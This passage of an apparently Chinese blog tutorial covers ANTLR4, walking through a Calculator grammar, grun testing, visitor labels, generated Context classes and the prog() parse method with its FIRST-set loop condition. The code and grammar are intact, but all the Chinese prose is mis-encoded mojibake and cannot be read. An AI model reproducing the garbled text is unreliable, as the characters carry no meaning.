class="line">        &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ANTLRInputStream input=new ANTLRInputStream(is);</span></span><br><span class="line">        CalculatorLexer lexer=<span class="keyword">new</span> <span class="title class_">CalculatorLexer</span>(input);</span><br><span class="line">        CommonTokenStream tokens=<span class="keyword">new</span> <span class="title class_">CommonTokenStream</span>(lexer);</span><br><span class="line">        CalculatorParser parser=<span class="keyword">new</span> <span class="title class_">CalculatorParser</span>(tokens);</span><br><span class="line">        ParseTree tree=parser.prog();</span><br><span class="line">        </span><br><span class="line">        System.out.println(tree.toStringTree(parser));</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">javac Calculator*.java Test.java</span><br><span class="line">java Test <span class="string">&quot;in.dat&quot;</span></span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br><span class="line">(prog (<span class="built_in">stat</span> (<span class="built_in">expr</span> 101) \r\n) (<span class="built_in">stat</span> a = (<span class="built_in">expr</span> 5) \r\n) (<span class="built_in">stat</span> b </span><br><span class="line">= (<span class="built_in">expr</span> 3) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> a) + (<span class="built_in">expr</span> (<span class="built_in">expr</span> b) * (<span class="built_in">expr</span> 2))) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 1) + (<span class="built_in">expr</span> a)) )) </span><br><span class="line">/ (<span class="built_in">expr</span> 2)) \r\n) (<span class="built_in">stat</span> (<span class="built_in">expr</span> (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 5) + (<span class="built_in">expr</span> 6)) )) * (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 4) + (<span class="built_in">expr</span> ( (<span class="built_in">expr</span> (<span class="built_in">expr</span> 7) - (<span class="built_in">expr</span> 8)) ))) &lt;missing <span class="string">&#x27;)&#x27;</span>&gt;)) \r\n))</span><br></pre></td></tr></table></figure>



<p>ä¹Ÿå¯ä»¥ä¸å†™æµ‹è¯•ç±»,ç›´æ¥ä½¿ç”¨grunæµ‹è¯•</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Users\Administrator\Desktop\antlr&gt; grun Calculator prog </span><br><span class="line">-gui in.dat</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\antlr&gt;java org.antlr.v4.gui.TestRig Calculator prog -gui in.dat</span><br><span class="line">line 6:14 missing <span class="string">&#x27;)&#x27;</span> at <span class="string">&#x27;\r\n&#x27;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526154940220.png" alt="image-20230526154940220"></p>
<p>antlrä¼šè‡ªåŠ¨æ£€æµ‹è¯­æ³•é”™è¯¯,å¹¶ä¸”ä¼šè‡ªåŠ¨ä»é”™è¯¯ä¸­æ¢å¤,ç»§ç»­è¿›è¡Œè¯­æ³•åˆ†æ</p>
<h2 id="è®¿é—®å™¨"><a href="#è®¿é—®å™¨" class="headerlink" title="è®¿é—®å™¨"></a>è®¿é—®å™¨</h2><p>å‰é¢çš„è¯­æ³•åˆ†æå™¨ä¸­,æˆ‘ä»¬å¹¶æ²¡æœ‰å®šä¹‰è¯­ä¹‰è§„åˆ™,è¯­æ³•æ ‘æ˜¯antlrè‡ªåŠ¨å¸®æˆ‘ä»¬ç”Ÿæˆçš„,ç°åœ¨éœ€è¦å®šä¹‰è¯­ä¹‰åŠ¨ä½œ,å®ç°è®¡ç®—å™¨åŠŸèƒ½</p>
<p>antlrä¸æ¨èåœ¨g4è§„åˆ™æ–‡ä»¶ä¸­å®šä¹‰è¯­ä¹‰åŠ¨ä½œ,è€Œæ˜¯åœ¨æœ¬æ–‡ä»¶ä¸­å®šä¹‰æ ‡ç­¾,ç„¶ååœ¨Visitorç±»ä¸­å®ç°æ ‡ç­¾ç›¸å…³çš„å‡½æ•°</p>
<h3 id="å®šä¹‰è¯­ä¹‰è§„åˆ™æ ‡ç­¾"><a href="#å®šä¹‰è¯­ä¹‰è§„åˆ™æ ‡ç­¾" class="headerlink" title="å®šä¹‰è¯­ä¹‰è§„åˆ™æ ‡ç­¾"></a>å®šä¹‰è¯­ä¹‰è§„åˆ™æ ‡ç­¾</h3><p>æ¯”å¦‚Calculator.g4</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">grammar Calculator;</span><br><span class="line">// import LexerRule;</span><br><span class="line"></span><br><span class="line">// è¯­æ³•å®šä¹‰</span><br><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (&#x27;*&#x27;|&#x27;/&#x27;) expr   #MulDiv</span><br><span class="line">|expr (&#x27;+&#x27;|&#x27;-&#x27;) expr        #AddSub</span><br><span class="line">|INT                        #int</span><br><span class="line">|ID                         #id</span><br><span class="line">|&#x27;(&#x27; expr &#x27;)&#x27;               #parens</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MUL: &#x27;*&#x27;;</span><br><span class="line">DIV: &#x27;/&#x27;;</span><br><span class="line">ADD: &#x27;+&#x27;;</span><br><span class="line">SUB: &#x27;-&#x27;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">ID: [a-zA-Z]+;</span><br><span class="line">INT:[0-9]+;</span><br><span class="line">WS:[ \t\n]+ -&gt;skip;//å¤šä½™çš„ç©ºæ ¼å›è½¦å¿½ç•¥</span><br><span class="line">NEWLINE: &#x27;\r&#x27;? &#x27;\n&#x27;;//\r\næ˜¯winä¸Šçš„æ¢è¡Œç¬¦,\ræ˜¯linuxä¸Šçš„æ¢è¡Œ</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œçš„#printExpr,#assignç­‰å°±æ˜¯æ ‡ç­¾</p>
<p>ç„¶åä½¿ç”¨ä¸‹è¿°å‘½ä»¤ç”Ÿæˆ</p>
<h3 id="ç”Ÿæˆè®¿é—®å™¨åŸºç±»"><a href="#ç”Ÿæˆè®¿é—®å™¨åŸºç±»" class="headerlink" title="ç”Ÿæˆè®¿é—®å™¨åŸºç±»"></a>ç”Ÿæˆè®¿é—®å™¨åŸºç±»</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">antlr4 -visitor Calculator.g4</span><br></pre></td></tr></table></figure>

<p>é¢å¤–ç”Ÿæˆäº†ä¸¤ä¸ªæ–‡ä»¶</p>
<table>
<thead>
<tr>
<th>æ–‡ä»¶</th>
<th>ä½œç”¨</th>
</tr>
</thead>
<tbody><tr>
<td>CalculatorVisitor.java</td>
<td>è®¿é—®å™¨æ¥å£</td>
</tr>
<tr>
<td>CalculatorBaseVisitor.java</td>
<td>è®¿é—®å™¨åŸºç±»</td>
</tr>
</tbody></table>
<p>è¿™ä¸ªè®¿é—®å™¨æ¥å£å®šä¹‰äº†ä¸€äº›å‡½æ•°</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Generated from Calculator.g4 by ANTLR 4.7.2</span></span><br><span class="line"><span class="keyword">import</span> org.antlr.v4.runtime.tree.ParseTreeVisitor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">CalculatorVisitor</span>&lt;T&gt; <span class="keyword">extends</span> <span class="title class_">ParseTreeVisitor</span>&lt;T&gt; &#123;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitProg</span><span class="params">(CalculatorParser.ProgContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">	T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªCalculator.g4ä¸­çš„æ ‡ç­¾éƒ½ä¼šå¯¹åº”ä¸€ä¸ªæ¥å£å‡½æ•°,æ¯”å¦‚#printExprå¯¹åº”åˆ°visitPrintExpr</p>
<p>å³ä½¿æ˜¯æ²¡æœ‰å†™æ ‡ç­¾çš„æ–‡æ³•,ä¹Ÿä¼šå¯¹åº”ä¸€ä¸ªæ¥å£å‡½æ•°,æ¯”å¦‚progå¯¹åº”åˆ°visitProg</p>
<p>æ—¢ç„¶è¿™æ ·,ä¸ºå•¥è¿˜è¦å®šä¹‰æ ‡ç­¾?ä½¿ç”¨é»˜è®¤çš„æ–‡æ³•å</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br></pre></td></tr></table></figure>

<p>å¯¹æ¯”ä¸€ä¸‹,progåªæœ‰ä¸€æ¡è§„åˆ™,ä½†æ˜¯statæœ‰ä¸‰æ¡è§„åˆ™,å› æ­¤éœ€è¦ç»™æ¯ä¸ªè§„åˆ™å®šä¹‰ä¸€ä¸ªæ ‡ç­¾,æ–¹ä¾¿ç»™è¯¥è§„åˆ™ä¸Šè¯­ä¹‰åŠ¨ä½œ</p>
<p>ä¹Ÿå°±æ˜¯è¯´,æ¯ä¸€ä¸ªç¿»è¯‘è§„åˆ™å¯¹åº”ä¸€ä¸ªæ ‡ç­¾</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stat -&gt; expr NEWLINE      #printExpr</span><br><span class="line">stat -&gt; ID &#x27;=&#x27; expr NEWLINE    #assign</span><br><span class="line">stat -&gt; NEWLINE                #blank</span><br></pre></td></tr></table></figure>



<p>è¦æ€ä¹ˆç”¨è¿™ä¸ªè®¿é—®å™¨å‘¢?</p>
<h3 id="å®šåˆ¶è®¿é—®å™¨"><a href="#å®šåˆ¶è®¿é—®å™¨" class="headerlink" title="å®šåˆ¶è®¿é—®å™¨"></a>å®šåˆ¶è®¿é—®å™¨</h3><p>åªéœ€è¦ç”¨ä¸€ä¸ªEvalVisitorç»§æ‰¿è¿™ä¸ªCalculatorBaseVisitor,ç„¶ååœ¨EvalVisitorä¸­å®ç°å‡½æ•°åŠŸèƒ½å³å¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526161920122.png" alt="image-20230526161920122"></p>
<p>ä¸éœ€è¦å…¨éƒ½å®ç°,å› ä¸ºCalculatorBaseVisitorä¸­å·²ç»å¸®æˆ‘ä»¬å®ç°äº†é»˜è®¤æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span> </span><br><span class="line"><span class="keyword">public</span> T <span class="title function_">visitPrintExpr</span><span class="params">(CalculatorParser.PrintExprContext ctx)</span> &#123; </span><br><span class="line">    <span class="keyword">return</span> visitChildren(ctx); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>ä»¥visitAssignçš„å®ç°ä¸ºä¾‹</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Integer <span class="title function_">visitAssign</span><span class="params">(CalculatorParser.AssignContext ctx)</span> &#123;</span><br><span class="line">    String id=ctx.ID().getText();</span><br><span class="line">    <span class="type">int</span> value=visit(ctx.expr());</span><br><span class="line">    memory.put(id,value);</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>CalculatorParser.AssignContext ctx</code>æ˜¯ä¸ªä»€ä¹ˆç©æ„å„¿,éƒ½æœ‰å•¥æˆå‘˜?</p>
<h4 id="visitå‡½æ•°å¹²äº†å•¥"><a href="#visitå‡½æ•°å¹²äº†å•¥" class="headerlink" title="visitå‡½æ•°å¹²äº†å•¥?"></a>visitå‡½æ•°å¹²äº†å•¥?</h4><p>é¦–å…ˆ,CalculatorParseræ˜¯antlr4å‘½ä»¤ç”Ÿæˆçš„è¯­æ³•åˆ†æå™¨ç±»,AssignContextæ˜¯å…¶å†…éƒ¨ç±»</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526170129061.png" alt="image-20230526170129061"></p>
<p>CalculatorParserä¸­æœ‰ä¼—å¤šå†…éƒ¨ç±»,æ¯ä¸ªæ ‡ç­¾åˆ†åˆ«å¯¹åº”ä¸€ä¸ªå†…éƒ¨ç±»</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">AssignContext</span> <span class="keyword">extends</span> <span class="title class_">StatContext</span> &#123;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">ID</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.ID, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> ExprContext <span class="title function_">expr</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="keyword">return</span> getRuleContext(ExprContext.class,<span class="number">0</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> TerminalNode <span class="title function_">NEWLINE</span><span class="params">()</span> &#123; <span class="keyword">return</span> getToken(CalculatorParser.NEWLINE, <span class="number">0</span>); &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="title function_">AssignContext</span><span class="params">(StatContext ctx)</span> &#123; copyFrom(ctx); &#125;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> &lt;T&gt; T <span class="title function_">accept</span><span class="params">(ParseTreeVisitor&lt;? extends T&gt; visitor)</span> &#123;</span><br><span class="line">		<span class="keyword">if</span> ( visitor <span class="keyword">instanceof</span> CalculatorVisitor ) <span class="keyword">return</span> ((CalculatorVisitor&lt;? <span class="keyword">extends</span> <span class="title class_">T</span>&gt;)visitor).visitAssign(<span class="built_in">this</span>);</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">return</span> visitor.visitChildren(<span class="built_in">this</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¯ä¸ªè¿™ç§<code>*Context</code>å†…éƒ¨ç±»çš„å®ä¾‹,éƒ½æ˜¯è¯­æ³•æ ‘ä¸Šçš„èŠ‚ç‚¹,è¿™ä¸€ç‚¹å¯ä»¥è§‚å¯Ÿ*Contextçš„ç±»ä½“ç³»éªŒè¯</p>
<p><img src="https://raw.githubusercontent.com/DeutschBall/VideoBed/main/image-20230526210500945.png" alt="image-20230526210500945"></p>
<p>ä»»ä½•<code>*Context</code>çš„ç›´æ¥çˆ¶ç±»éƒ½æ˜¯<code>ParseRuleContext</code>ç±»,è¯¥ç±»ä¸­æœ‰ä¸€ä¸ª<code>List&lt;ParseTree&gt; children</code>æ•°ç»„,ç”¨æ¥å­˜æ”¾å­èŠ‚ç‚¹çš„å¥æŸ„</p>
<p>æ— éœ€ç½®ç–‘,è¿™å°±æ˜¯èŠ‚ç‚¹ç±»</p>
<h5 id="EvalVisitor-CalculatorParser-ParserTreeä¸‰è€…æ˜¯å¦‚ä½•äº¤äº’çš„"><a href="#EvalVisitor-CalculatorParser-ParserTreeä¸‰è€…æ˜¯å¦‚ä½•äº¤äº’çš„" class="headerlink" title="EvalVisitor,CalculatorParser,ParserTreeä¸‰è€…æ˜¯å¦‚ä½•äº¤äº’çš„?"></a>EvalVisitor,CalculatorParser,ParserTreeä¸‰è€…æ˜¯å¦‚ä½•äº¤äº’çš„?</h5><p>è·Ÿéšæµ‹è¯•ç±»çš„æ§åˆ¶æµè§‚å¯Ÿ</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ParseTree tree=parser.prog();</span><br><span class="line">EvalVisitor eval=<span class="keyword">new</span> <span class="title class_">EvalVisitor</span>();</span><br><span class="line">eval.visit(tree);</span><br></pre></td></tr></table></figure>

<p>ParserTreeä»¥parser.prog()å…¥å£,å¯ä»¥æ¨æµ‹è¯¥å‡½æ•°åº”è¯¥æ˜¯æ•´ä¸ªé€’å½’ä¸‹é™è¯­æ³•åˆ†æçš„å…¥å£,å…¶è¿”å›å€¼æ˜¯ä¸€ä¸ª ä»¥progèŠ‚ç‚¹ä¸ºæ ¹çš„è¯­æ³•æ ‘,ç„¶åå°†è¯¥æ ‘æ ¹äº¤ç»™å¥æŸ„tree</p>
<p>æ ¹æ®æˆ‘ä»¬è‡ªå·±å†™çš„æ–‡æ³•,æ•´ä¸ªç¨‹åºç¡®å®åªæœ‰ä¸€ä¸ªprog,ç„¶åæ˜¯<code>prog-&gt;stat+</code>,ä¹Ÿå°±æ˜¯æ¨å¯¼æˆè‹¥å¹²stat</p>
<p>ä¸‹é¢éªŒè¯ä¸€ä¸‹è¿™ä¸ªprogå‡½æ•°æ˜¯å¦å¦‚æˆ‘ä»¬æ‰€æ–™</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> ProgContext <span class="title function_">prog</span><span class="params">()</span> <span class="keyword">throws</span> RecognitionException &#123;</span><br><span class="line">	<span class="type">ProgContext</span> <span class="variable">_localctx</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProgContext</span>(_ctx, getState());<span class="comment">//åˆ›å»ºContextèŠ‚ç‚¹,ctxæ˜¯contextç¼©å†™,ä¸€èˆ¬__ctxè¡¨ç¤ºå½“å‰ä¸Šä¸‹æ–‡ä¿¡æ¯,ä¹Ÿå°±æ˜¯çˆ¶èŠ‚ç‚¹</span></span><br><span class="line">       </span><br><span class="line">	enterRule(_localctx, <span class="number">0</span>, RULE_prog);<span class="comment">//è¿›å…¥progæ–‡æ³•çŠ¶æ€</span></span><br><span class="line">	<span class="type">int</span> _la;<span class="comment">//è¾“å…¥ä¸­çš„ä¸‹ä¸€ä¸ªè¯æ³•ç¬¦å·çš„æ ‡è¯†</span></span><br><span class="line">	<span class="keyword">try</span> &#123;</span><br><span class="line">		enterOuterAlt(_localctx, <span class="number">1</span>);</span><br><span class="line">		&#123;</span><br><span class="line">		setState(<span class="number">7</span>); </span><br><span class="line">		_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">		_la = _input.LA(<span class="number">1</span>);</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			&#123;</span><br><span class="line">			&#123;</span><br><span class="line">			setState(<span class="number">6</span>);</span><br><span class="line">			stat();</span><br><span class="line">			&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			setState(<span class="number">9</span>); </span><br><span class="line">			_errHandler.sync(<span class="built_in">this</span>);</span><br><span class="line">			_la = _input.LA(<span class="number">1</span>);<span class="comment">//ä»è¾“å…¥æµä¸­å–ä¸‹ä¸€ä¸ªç¬¦å·</span></span><br><span class="line">		&#125; <span class="keyword">while</span> ( (((_la) &amp; ~<span class="number">0x3f</span>) == <span class="number">0</span> &amp;&amp; ((<span class="number">1L</span> &lt;&lt; _la) &amp; ((<span class="number">1L</span> &lt;&lt; T__1) | (<span class="number">1L</span> &lt;&lt; ID) | (<span class="number">1L</span> &lt;&lt; INT) | (<span class="number">1L</span> &lt;&lt; NEWLINE))) != <span class="number">0</span>) );</span><br><span class="line">               <span class="comment">//åªè¦ä¸‹ä¸€ä¸ªå¾…è§£æçš„è¯æ³•ç¬¦å·çš„ç±»å‹æ˜¯ T__1ã€IDã€INT æˆ– NEWLINE ä¸­çš„ä»»æ„ä¸€ç§ï¼Œå°±æ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">catch</span> (RecognitionException re) &#123;</span><br><span class="line">		_localctx.exception = re;</span><br><span class="line">		_errHandler.reportError(<span class="built_in">this</span>, re);</span><br><span class="line">		_errHandler.recover(<span class="built_in">this</span>, re);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">finally</span> &#123;</span><br><span class="line">		exitRule();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> _localctx;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¦‚æˆ‘ä»¬æ‰€æ–™,progå‡½æ•°çš„do-whileå¾ªç¯ä¸­è°ƒç”¨äº†statå‡½æ•°</p>
<p>prog&#x3D; stat \n stat \n statâ€¦</p>
<p>è¿™ä¸ªprogå‡½æ•°ä¸­çš„do-whileå¾ªç¯,æ¯å¾ªç¯ä¸€æ¬¡,é€’å½’ä¸‹é™åˆ†æä¸€æ¬¡stat</p>
<p>ä¸ºå•¥do-whileå¾ªç¯çš„ç»§ç»­æ¡ä»¶æ˜¯â€ä¸‹ä¸€ä¸ªå¾…è§£æçš„è¯æ³•ç¬¦å·çš„ç±»å‹æ˜¯ T__1ã€IDã€INT æˆ– NEWLINE ä¸­çš„ä»»æ„ä¸€ç§ï¼Œå°±æ‰§è¡Œå¾ªç¯ä½“ä¸­çš„è¯­å¥â€</p>
<p>æ‰€æœ‰çš„è¯æ³•ç¬¦å·ç±»å‹éƒ½è¢«å®šä¹‰åœ¨CalculatorLexer.tokensä¸­</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">T__0=<span class="number">1</span></span><br><span class="line">T__1=<span class="number">2</span></span><br><span class="line">T__2=<span class="number">3</span></span><br><span class="line">MUL=<span class="number">4</span></span><br><span class="line">DIV=<span class="number">5</span></span><br><span class="line">ADD=<span class="number">6</span></span><br><span class="line">SUB=<span class="number">7</span></span><br><span class="line">ID=<span class="number">8</span></span><br><span class="line">INT=<span class="number">9</span></span><br><span class="line">WS=<span class="number">10</span></span><br><span class="line">NEWLINE=<span class="number">11</span></span><br><span class="line"><span class="string">&#x27;=&#x27;</span>=<span class="number">1</span></span><br><span class="line"><span class="string">&#x27;(&#x27;</span>=<span class="number">2</span></span><br><span class="line"><span class="string">&#x27;)&#x27;</span>=<span class="number">3</span></span><br><span class="line"><span class="string">&#x27;*&#x27;</span>=<span class="number">4</span></span><br><span class="line"><span class="string">&#x27;/&#x27;</span>=<span class="number">5</span></span><br><span class="line"><span class="string">&#x27;+&#x27;</span>=<span class="number">6</span></span><br><span class="line"><span class="string">&#x27;-&#x27;</span>=<span class="number">7</span></span><br></pre></td></tr></table></figure>

<p>T__1&#x3D;&#x3D;â€™(â€˜</p>
<p>ä¹Ÿå°±æ˜¯è¯´,ä¸‹ä¸€ä¸ªç¬¦å·å¿…é¡»å¾—æ˜¯â€™(â€˜,æˆ–è€…ID,INT,NEWLINE</p>
<p>ç„¶è€Œå†çœ‹æˆ‘ä»¬çš„è¯­æ³•è§„åˆ™å®šä¹‰</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">prog: stat+;</span><br><span class="line"></span><br><span class="line">stat: expr NEWLINE      #printExpr</span><br><span class="line">|ID <span class="string">&#x27;=&#x27;</span> expr NEWLINE    #assign</span><br><span class="line">|NEWLINE                #blank</span><br><span class="line">;</span><br><span class="line"></span><br><span class="line">expr: expr (<span class="string">&#x27;*&#x27;</span>|<span class="string">&#x27;/&#x27;</span>) expr   #MulDiv</span><br><span class="line">|expr (<span class="string">&#x27;+&#x27;</span>|<span class="string">&#x27;-&#x27;</span>) expr        #AddSub</span><br><span class="line">|INT                        #<span class="type">int</span></span><br><span class="line">|ID                         #id</span><br><span class="line">|<span class="string">&#x27;(&#x27;</span> expr <span class="string">&#x27;)&#x27;</span>               #parens</span><br><span class="line">;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å¯¹statæ±‚ä¸€ä¸‹Firsté›†åˆ</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">first(stat)=first(expr)+&#123;ID&#125;+&#123;NEWLINE&#125;=&#123;&#x27;(&#x27;,INT,ID,NEWLINE&#125;</span><br></pre></td></tr></table></figure>

<p>æ­£å¥½å°±æ˜¯do-whileå¾ªç¯çš„æ¡ä»¶</p>
<p>æ ¹æ®ç¼–è¯‘åŸç†çš„ç†è®º,åªæœ‰å½“ä¸‹ä¸€ä¸ªç¬¦å·åœ¨å½“å‰æ–‡æ³•çš„Firsté›†åˆä¸­æ—¶,æ‰ä¼šä»å½“å‰æ–‡æ³•å¼€å§‹è¿›è¡Œé€’å½’ä¸‹é™è¯­æ³•åˆ†æ</p>
<p>è¿˜æœ‰ä¸€ä¸ªé—®é¢˜,progèŠ‚ç‚¹æ˜¯ä½•æ—¶æŠŠè¯¸å¤šstatèŠ‚ç‚¹è®¾ä¸ºè‡ªå·±çš„å­—èŠ‚ç‚¹çš„,ä¹Ÿå°±æ˜¯è¯´statèŠ‚ç‚¹æ˜¯ä½•æ—¶æŒ‚åˆ°è¯­æ³•æ ‘ä¸Šçš„?</p>
